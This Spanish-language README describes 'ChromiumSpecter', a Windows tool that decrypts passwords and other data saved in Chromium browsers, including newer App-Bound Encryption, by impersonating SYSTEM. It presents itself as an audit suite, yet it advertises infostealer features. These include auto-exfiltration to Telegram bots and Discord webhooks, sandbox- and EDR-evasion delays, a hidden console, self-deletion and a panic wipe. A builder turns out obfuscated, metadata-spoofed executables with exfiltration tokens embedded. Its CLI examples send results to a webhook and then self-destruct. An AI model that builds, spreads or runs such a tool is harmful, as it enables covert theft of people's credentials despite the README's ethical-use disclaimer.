# 🛡️ ChromiumSpecter Auditor Suite `v2.6.0` (V20 Stable)

> [!NOTE]
> [English Version](README.en.md) | **Versión en Español**

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*La suite definitiva de grado táctico para auditorías de seguridad en navegadores Chromium (Chrome, Edge, Brave, Vivaldi, Opera, Opera GX).*

[Reportar Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)

</div>

---

<div align="center">
  <img src="screenshots/dashboard.png" width="800" alt="ChromiumSpecter Dashboard">
</div>

---

### 📐 Comparativa de Arquitectura: Impersonación CNG vs. Inyección de Código

ChromiumSpecter implementa un motor de descifrado directo mediante impersonación de SYSTEM. A diferencia de otras herramientas tácticas del sector como [Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption.git) (C++), que dependen de la inyección de código ruidoso en memoria, nuestra arquitectura prioriza la estabilidad operativa y el sigilo defensivo.

| Característica | Impersonación CNG + SYSTEM (ChromiumSpecter) | Enfoque COM + Inyección (C++ - Chrome-App-Bound-Encryption-Decryption) |
| :--- | :--- | :--- |
| **Requisito de Privilegios** | Requiere privilegios de Administrador (para impersonar `winlogon` y habilitar `SeDebugPrivilege`). | **VENTAJA:** No requiere privilegios elevados (corre bajo el usuario estándar). |
| **Firma de Evasión (AV / EDR)** | **VENTAJA:** Extremely silent. No inyecta código, no crea procesos suspendidos, no altera la memoria de otros procesos. Utiliza únicamente APIs legítimas de Windows (`ncrypt.dll`). | **CRÍTICO:** Ruidoso. La inyección DLL, el Process Hollowing y el uso de Direct Syscalls son altamente monitoreados y bloqueados por EDRs modernos. |
| **Resistencia a Actualizaciones** | **VENTAJA:** Altamente resistente. Mientras el navegador registre la clave en el KSP de Windows con el mismo nombre, el descifrado funciona independientemente de cambios en la interfaz COM. | **DESVENTAJA:** Frágil. Cambios en las interfaces internas de los navegadores (como la transición a `IElevator2` en Chrome 144) inutilizan las stubs de C++ y exigen reescritura. |
| **Complejidad del Código** | **VENTAJA:** Baja complejidad. Lógica pura de interacción con la API de Windows mediante `ctypes` de Python. | **DESVENTAJA:** Altísima complejidad. Requiere cargadores PE en memoria, manejo de offsets de VTable y stubs de interfaces COM para cada navegador. |

## 💻 Resumen de Capacidades

**ChromiumSpecter** es una suite de auditoría de credenciales diseñada para entornos Windows, enfocada en la discreción, la automatización y la ergonomía operativa. Permite extraer, descifrar y exfiltrar datos de navegadores basados en Chromium (v80+) con una arquitectura modular y resiliente.

### 🌟 Características Destacadas

* **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados.
* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.6.0`**:
  * Soporte nativo total para **Chrome v127+, Edge v127+ y Brave v130+ (App-Bound Encryption)** mediante el módulo `v20_decryptor`.
  * Descifrado híbrido: Soporta **AES-GCM (v10/v11)**, **DPAPI Legacy** y el nuevo esquema **v20** de forma simultánea en la misma base de datos.
  * **Soporte Brave Direct Key**: Mapeo automático de payloads de 32 bytes directos sin flags complejos.
  * **Sincronización Inteligente**: El motor ahora utiliza importaciones dinámicas para sobrevivir a ofuscadores y garantizar portabilidad.
  * **Escalada de Privilegios**: Implementa impersonación nativa de SYSTEM (vía `winlogon.exe`) para extraer llaves protegidas por el sistema. **(Requiere ejecutar como Administrador)**.
  * Detección inteligente: El motor identifica el prefijo (`v10`, `v11`, `v20`) y aplica el algoritmo correspondiente con fallback automático.
* **🕵️ Motor de Sigilo (Tactical Stealth)**:
  * **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandboxes.
  * **Inter-file Delay (`send_delay`)**: Pausas personalizables entre envíos para prevenir picos de tráfico que alerten a firewalls o EDRs.
  * **Anti-Forensics**: Soporte para **Autodestrucción Táctica** (Auto-Delete) del binario tras la ejecución.
  * **Protocolo de Pánico**: Saneamiento total del entorno de auditoría con un solo clic.
* **🧠 Detección Inteligente de Perfiles**:
  * Escaneo diferenciado y visualización premium integrada (badges de colores de marca para Chrome, Edge, Brave, Vivaldi, Opera y Opera GX).
  * Validación de tamaño de archivo antes de procesar (evita falsos positivos con BD vacías).
  * Manejo de `PermissionError` por perfil sin abortar el escaneo completo.

<div align="center">
  <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
</div>

### 🚀 Exfiltración Inteligente

* **Auto-Exfiltración**: Configuración para envío automático inmediato tras la auditoría.
* **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
* **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.

### 🛠️ Builder Visual Integrado `v2.6.0`

Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
**Universal Dependency Injection**: El builder ahora parsea automáticamente `requirements.txt` y resuelve dependencias en tiempo de compilación.
**Spoofing de Metadatos**: Presets integrados para clonar firmas.
**Compresión y Ofuscación**: Soporte nativo para UPX y PyArmor.

<div align="center">
  <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
</div>

---

## 🚀 Flujo de Trabajo Táctico

1. **Configuración**: Define tus tokens de Telegram/Discord en el Tab de **Exfiltración** y guárdalos.
2. **Auditoría**: Lanza el escaneo desde el Dashboard. Puedes activar la **Auto-exfiltración** y **Autodestrucción** para un ciclo de "ejecución y olvido".
3. **Inspección**: Visualiza las credenciales descifradas en tiempo real en el Tab de **Resultados**.
4. **Despliegue**: Usa el **Builder** para generar un `.exe` con tus credenciales embebidas (Base64) y presets de sigilo configurados.

## 🖥️ Uso Avanzado (CLI)

El motor principal (`main.py`) puede ejecutarse de forma independiente sin la interfaz gráfica, ideal para automatizaciones o despliegues rápidos via terminal.

> [!IMPORTANT]
> **REQUERIMIENTO DE PRIVILEGIOS**: Para descifrar perfiles de **Chrome, Edge y Brave v127+ (V20)**, es **OBLIGATORIO** ejecutar la terminal (o el `.exe`) con **privilegios de Administrador**. Sin estos privilegios, el motor no podrá realizar la impersonación de SYSTEM necesaria para acceder al almacén de llaves CNG.

```bash
# Auditoría básica
python main.py

# Auditoría con exfiltración automática a Discord
python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct

# Auditoría silenciosa (sin consola) y guardado en carpeta personalizada
python main.py --stealth --output-dir "C:\temp\logs"
```

### Parámetros Disponibles (CLI)

| Grupo | Parámetro | Descripción |
| :--- | :--- | :--- |
| **Exfiltración** | `--webhook` | Discord Webhook URL para envío de reportes. |
| | `--tg-token` | Token del bot de Telegram. |
| | `--tg-chat-id` | ID del chat o canal de Telegram. |
| | `--no-exfil` | Desactiva el envío externo de datos. |
| **Reportes** | `--no-html` | No genera el reporte visual en HTML. |
| | `--no-csv` | No genera el reporte estructurado en CSV. |
| | `--json` | Genera un reporte adicional en formato JSON. |
| | `--output-dir` | Carpeta de salida (default: `.audit`). |
| **Motor** | `--browser` | Filtra por un navegador específico (chrome, brave, etc). |
| | `--delay` | Retraso inicial (segundos) antes de actuar. |
| | `--stealth` | **Modo Stealth**: Oculta la ventana de consola inmediatamente al arrancar (vía API de Windows). |
| | `--auto-kill` | Cierra navegadores automáticamente si la base de datos está bloqueada. |
| | `--self-destruct` | **Elimina el ejecutable** tras finalizar el ciclo. |
| | `--no-wipe` | No borra los reportes locales tras enviarlos. |
| | `--clean` | Limpia todos los reportes antiguos en la carpeta de salida. |
| | `--debug` | Muestra logs detallados de depuración. |

---

## ⚙️ Parámetros de Compilación (Stub)

Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu binario final. Las opciones marcadas con 📡 solo están disponibles cuando el archivo fuente es `main.py` o una copia del mismo.

| Parámetro | Rango / Opción | Propósito |
| :--- | :--- | :--- |
| **Delay Inicial** | 0s - 3600s | Retraso antes de la primera acción (Anti-Sandbox). |
| **Send Delay** | 0s - 60s | Pausa entre archivos enviados (Evasion de tráfico). |
| **Webhook Timeout** | 1s - 300s | Tiempo de espera para conexiones inestables. |
| **📡 Auto-Exfiltrar** | Checkbox | Activa el envío automático sin intervención al ejecutar. |
| **📡 Modo Stealth** | Runtime Flag | Oculta la consola al arrancar (vía `ShowWindow` Win32 API). |
| **💥 Autodestrucción** | Checkbox | Elimina el `.exe` tras finalizar el ciclo. |
| **UAC Prompt** | Toggle | Solicita privilegios de administrador si es necesario. |
| **Ofuscar con PyArmor** | Toggle | Aplica ofuscación al código fuente antes de compilar. |
| **Compresión UPX** | Toggle | Comprime el binario final (reduce tamaño ~30-50%). |
| **Mostrar Consola** | Compiler Flag | Genera un `Console App`. Si está desmarcado, genera un `Windowed App` invisible. |

> [!TIP]
> **Diferencia Técnica — Mostrar Consola vs Modo Stealth**:
> - **Mostrar Consola** (Compilador): Determina si el **Sistema Operativo** crea la ventana desde cero. Desmarcado = `Windowed App`, nunca hay ventana negra.
> - **Modo Stealth** (Runtime): La ventana sí se crea, pero el código la oculta en milisegundos con `ShowWindow(0)`. Puede verse un destello breve.
> - **Recomendación**: Dejá "Mostrar Consola" **desmarcado** + "Modo Stealth" **marcado** para doble capa de sigilo.

---

## 🛠️ Stack Tecnológico

| Componente | Tecnología |
| :--- | :--- |
| **Core UI** | `CustomTkinter` (Modern Dark Theme) |
| **Criptografía** | `v20 (App-Bound)`, `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` + `SYSTEM Token Impersonation` |
| **Seguridad OS** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`, `DuplicateTokenEx`, `ImpersonateLoggedOnUser`) |
| **Compilación** | `PyInstaller` + `PyArmor` + `UPX` |
| **Persistencia** | `JSON` Local (`.audit/exfil_config.json`) |
| **Testing** | `pytest` + `pytest-mock` (22 tests, 0 fallos) |

---

## ⚙️ Guía de Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/ANONIMO432HZ/ChromiumSpecter
cd ChromiumSpecter

# 2. Instalar dependencias
pip install -r requirements.txt

# 3. Lanzar el Dashboard
python gui_app.py
```

---

## 🧪 Calidad y Testing

La suite incluye una batería de pruebas automatizadas para garantizar la integridad de los algoritmos de descifrado y los canales de exfiltración.

```bash
# Ejecutar todos los tests
pytest -v
```

---

## ⚖️ Licencia y Uso Ético

### Licencia
Este proyecto está bajo la licencia **GNU General Public License v3.0 (GPLv3)**. Esto significa que puedes usar, modificar y distribuir el software, pero cualquier trabajo derivado debe ser también de código abierto bajo la misma licencia y **debe dar crédito explícito al autor original (ANONIMO432HZ)**. Consulta el archivo [LICENSE](LICENSE) para más detalles.

> [!CAUTION]
> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
> El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.

---
